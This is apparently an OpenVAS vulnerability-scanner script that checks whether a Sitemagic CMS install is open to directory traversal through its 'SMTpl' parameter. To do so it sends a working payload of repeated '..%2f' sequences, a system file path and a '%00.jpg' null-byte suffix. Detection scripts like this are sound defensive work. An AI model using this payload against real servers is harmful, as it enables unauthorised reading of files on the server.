if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902452" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)" );
	script_bugtraq_id( 48399 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/48399" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/102498/sitemagic-traversal.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to obtain
  arbitrary local files in the context of the web server process." );
	script_tag( name: "affected", value: "Sitemagic CMS version 2010.04.17" );
	script_tag( name: "insight", value: "The flaw is due to improper sanitisation of user supplied input
  through the 'SMTpl' parameter in 'index.php'." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Sitemagic CMS and is prone to directory
  traversal vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/Sitemagic", "/CMS", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(ContainsString( res, "<title>Sitemagic CMS</title>" )){
		for file in keys( files ) {
			url = NASLString( dir, "/index.php?SMTpl=", crap( data: "..%2f", length: 5 * 10 ), files[file], "%00.jpg" );
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

